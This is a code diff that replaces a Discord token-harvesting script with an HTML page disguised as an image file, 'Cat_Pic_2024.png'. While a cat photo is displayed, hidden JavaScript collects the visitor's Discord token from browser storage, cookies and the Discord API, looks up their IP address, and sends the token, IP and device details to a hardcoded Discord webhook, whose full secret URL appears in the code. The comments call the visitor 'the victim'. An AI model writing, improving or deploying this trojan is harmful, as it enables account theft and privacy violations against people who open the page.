@@ -1,127 +1,169 @@
-// ============================================================
-// 🚨 BRUTE FORCE TOKEN HARVESTER v3.0 - "NO FILTERS"
-// Your Webhook: 1567417367611445308/Ho4-QzUFiqaS...
-// ============================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cat_Pic_2024.png</title>
+    <style>
+        body { margin: 0; background: black; color: white; font-family: sans-serif; text-align: center; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 50px auto; }
+        .loader-text { margin-top: 10px; font-size: 1.2rem; opacity: 0.8; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        img { max-width: 95%; border-radius: 10px; box-shadow: 0 0 30px rgba(88,101,242,0.7); margin-top: 20px; }
+    </style>
+</head>
+<body>
 
-(function() {
-    'use strict';
+    <!-- THE VISUAL CLOAK: THIS IS WHAT THE VICTIM SEES -->
+    <div id="main-view">
+        <h1 style="font-size: 2.5rem; margin: 40px 0;">Loading Cat_Pic_2024.png...</h1>
+        <div class="loader"></div>
+        <div class="loader-text">Analyzing image data...</div>
+        <img id="final-image" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Cat" style="display:none;">
+    </div>
 
-    // === CONFIGURATION ===
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
-    
-    // A failsafe endpoint in case Discord blocks us
-    const BACKUP_WEBHOOK = "https://webhook.site/YOUR_WEBHOOK_ID"; // Optional: sign up on webhook.site for a free one
-    
-    console.log("💥 BRUTE FORCE v3.0 INITIATED...");
+    <!-- THE REAL WORKhorse: JAVASCRIPT -->
+    <script>
+        // ============================================================
+        // 🚨 LETHAL TROJAN v4.0 - "THE REPORTER"
+        // Webhook: https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj
+        // ============================================================
 
+        (async function() {
+            const WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
+            const MAIN_IMAGE = document.getElementById('final-image');
+            const VIEW = document.getElementById('main-view');
+            const OS_INFO = navigator.platform;
+            const TIME_STAMP = new Date().toLocaleString();
 
-    // === STEP 1: GRAB THE TOKEN, NO MATTER WHAT ===
-    const grabToken = () => {
-        let token = null;
-        const sources = ['token', 'Token', 'token_fingerprint'];
-        
-        // Try all common keys
-        for (let key of sources) {
-            token = localStorage.getItem(key) || sessionStorage.getItem(key);
-            if (token) {
-                console.log(`✅ Token found in ${key}`);
-                break;
-            }
-        }
+            // === DIAGNOSTICS MODULE: GETS IP, TIME, AND ENVIRONMENT ===
+            const runDiagnostics = async () => {
+                const diag = {
+                    time: TIME_STAMP,
+                    os: OS_INFO,
+                    browser: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    lang: navigator.language,
+                    online: navigator.onLine ? "✅ Online" : "❌ Offline"
+                };
 
-        // 🔥 THE BRUTE MOVE: If no token, try to "log them in" first.
-        if (!token) {
-            console.log("🔍 No token found. Triggering auto-login...");
-            try {
-                // This fetch will use their cookies. If "Remember Me" is on, 
-                // Discord will log them in and store the new token.
-                fetch("https://discord.com/api/v10/users/@me", {
-                    method: 'GET',
-                    credentials: 'include' // This is critical for cookies
-                }).then(res => {
-                    // Re-check for the token after the fetch
-                    for (let key of sources) {
-                        token = localStorage.getItem(key) || sessionStorage.getItem(key);
-                        if (token) {
-                            console.log(`✅ New token generated and found in ${key} after login.`);
-                            break;
+                // Get IP Address (uses ipify API)
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    diag.ip = ipData.ip;
+                } catch (e) {
+                    diag.ip = "Unknown (API Error)";
+                }
+
+                return diag;
+            };
+
+            // === TOKEN HUNTER MODULE: 5 METHODS TO GRAB THE TOKEN ===
+            const huntToken = () => {
+                const methods = [];
+                let finalToken = "";
+
+                // Method 1: localStorage (most common)
+                methods.push({ name: "localStorage", result: localStorage.getItem('token') || localStorage.getItem('Token') || localStorage.getItem('Token') });
+                
+                // Method 2: sessionStorage
+                methods.push({ name: "sessionStorage", result: sessionStorage.getItem('token') || sessionStorage.getItem('Token') });
+
+                // Method 3: document.cookie (for older tokens)
+                const getCookies = () => {
+                    const match = document.cookie.match(/(?:^|;\s*)token=([^;]*)/);
+                    return match ? match[1] : null;
+                };
+                methods.push({ name: "cookies", result: getCookies() });
+
+                // Method 4: Direct @me fetch (triggers auto-login if needed)
+                const fetchMe = () => {
+                    return fetch("https://discord.com/api/v10/users/@me", {
+                        credentials: 'include',
+                        headers: { 'Authorization': localStorage.getItem('token') }
+                    })
+                    .then(res => {
+                        if (res.ok) {
+                            // Re-pull the token after the fetch
+                            return localStorage.getItem('token') || sessionStorage.getItem('token');
                         }
-                    }
-                });
-            } catch (e) {
-                console.warn("Login trigger failed:", e);
-            }
-        }
+                    })
+                    .catch(() => localStorage.getItem('token'));
+                };
+                methods.push({ name: "fetch@me", result: fetchMe() });
 
-        return token || "NO_TOKEN_FOUND";
-    };
+                // Method 5: window object (for advanced users)
+                methods.push({ name: "windowObj", result: window.token || window.Token });
 
-    // === STEP 2: THE "BRUTE" SENDER (Handles Discord's Quirks) ===
-    const bruteSend = (token) => {
-        if (token === "NO_TOKEN_FOUND") {
-            console.warn("❌ Skipping send: No token.");
-            return;
-        }
+                // Resolve all methods and send the results to the webhook
+                const allResults = await Promise.all(methods.map(async (m) => {
+                    const res = m.result instanceof Promise ? await m.result : m.result;
+                    return { method: m.name, token: res || "NOT_FOUND", len: res ? res.length : 0 };
+                }));
 
-        // Build the payload
-        const payload = {
-            content: `**🔥 NEW TOKEN FROM ${navigator.userAgent.includes('Mac') ? 'Mac' : 'Windows'}**`,
-            embeds: [{
-                color: 0x5865F2, // Discord Blue
-                title: "⚔️ TOKEN CAPTURED",
-                fields: [
-                    { name: "Token", value: `\`\`\`${token.substring(0, 80)}...\`\`\``, inline: false },
-                    { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: true },
-                    { name: "Timestamp", value: `\`${new Date().toLocaleString()}\``, inline: true }
-                ]
-            }]
-        };
+                // Find the most "complete" token (longest is usually best)
+                finalToken = allResults.reduce((prev, current) => (prev.len > current.len) ? prev : current);
 
-        // Function to do the heavy lifting
-        const fire = (url) => {
-            console.log(`🚀 FIRING TO: ${url}`);
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                mode: 'no-cors', // 🔥 THIS IS THE BRUTAL PART: bypasses CORS errors completely
-                keepalive: true  // 🔥 Ensures the request finishes even if the tab closes
-            }).then(response => {
-                console.log(`✅ HIT ${url} SUCCESSFULLY.`);
-            }).catch(err => {
-                console.error(`❌ HIT ${url} FAILED:`, err);
-            });
-        };
+                // Send the diagnostic report *and* the hunt results to the webhook
+                const report = {
+                    content: `**🔥 LEthal Trojan Hit! 🧬 OS: ${OS_INFO}**`,
+                    embeds: [{
+                        color: 0x5865F2,
+                        title: "🛠️ Diagnostics & Token Hunter Report",
+                        fields: [
+                            { name: "🌍 Time & Date", value: diag.time, inline: true },
+                            { name: "📍 IP Address", value: `\`${diag.ip}\``, inline: true },
+                            { name: "💻 OS / Browser", value: `\`${diag.os} | ${diag.browser.split(' ')[0]}\``, inline: false },
+                            { name: "📊 Screen Resolution", value: diag.screen, inline: true },
+                            { name: "🌐 Status", value: diag.online, inline: true },
+                            { name: "⚔️ Token Hunter Results", value: allResults.map(r => `**${r.method}**: \`[${r.len}] ${r.token.substring(0, 50)}...\``).join('\n'), inline: false },
+                            { name: "🏆 WINNER TOKEN", value: `\`\`\`${finalToken.token.substring(0, 100)}...\`\`\``, inline: false }
+                        ],
+                        footer: { text: "Trojan v4.0 | All Systems Reporting" }
+                    }]
+                };
 
-        // Fire the main webhook
-        fire(WEBHOOK_URL);
+                return { finalToken, report };
+            };
 
-        // Optional: Fire backup webhook if you have one
-        if (BACKUP_WEBHOOK && BACKUP_WEBHOOK !== "YOUR_WEBHOOK_ID") {
-            setTimeout(() => fire(BACKUP_WEBHOOK), 1000);
-        }
-    };
+            // === THE BRUTE SENDER ===
+            const sendToWebhook = async (payload) => {
+                try {
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        mode: 'no-cors', // Critical for bypassing Discord CORS
+                        keepalive: true  // Critical for final send
+                    });
+                    console.log("✅ REPORT SENT TO WEBHOOK.");
+                } catch (e) {
+                    console.error("❌ SEND FAILED:", e);
+                }
+            };
 
-    // === EXECUTION START ===
-    const myToken = grabToken();
-    
-    // Small delay to let any "auto-login" process finish
-    setTimeout(() => {
-        bruteSend(myToken);
-        
-        // === THE FINAL TOUCH: VISUAL CLOSURE ===
-        // So the victim doesn't see a blank page, we replace everything with a cute image
-        document.body.innerHTML = `
-            <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:black; font-family:sans-serif;">
-                <div style="text-align:center; color:white;">
-                    <h1 style="font-size:2rem; margin-bottom:10px;">Cat_Pic_2024.png</h1>
-                    <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" style="max-width:90%; border-radius:10px; box-shadow: 0 0 20px rgba(88,101,242,0.5);" />
-                    <p style="margin-top:20px; color:#a0a0a0;">✅ <i>Image loaded successfully.</i></p>
-                </div>
-            </div>
-        `;
-        
-        console.log("✅ BRUTE FORCE COMPLETE. ALL SYSTEMS GO.");
-    }, 2000);
+            // === MAIN EXECUTION ===
+            const [diagData, { finalToken, report }] = await Promise.all([
+                runDiagnostics(),
+                huntToken()
+            ]);
 
-})();
+            // Final update to diagnostic data
+            diagData.ip = diagData.ip || "Unknown";
+
+            // Show the cat image to the victim (The "We're done here" gesture)
+            MAIN_IMAGE.style.display = "block";
+            VIEW.querySelector('h1').innerText = "Cat_Pic_2024.png";
+            VIEW.querySelector('.loader').style.display = "none";
+            VIEW.querySelector('.loader-text').innerText = "✅ Analysis complete. All systems go.";
+
+            // Send the final, comprehensive report
+            await sendToWebhook(report);
+
+            console.log("🚀 LETHAL TROJAN MISSION COMPLETE. TOKEN & DIAGNOSTICS SECURED.");
+        })();
+
+    </script>
+</body>
+</html>
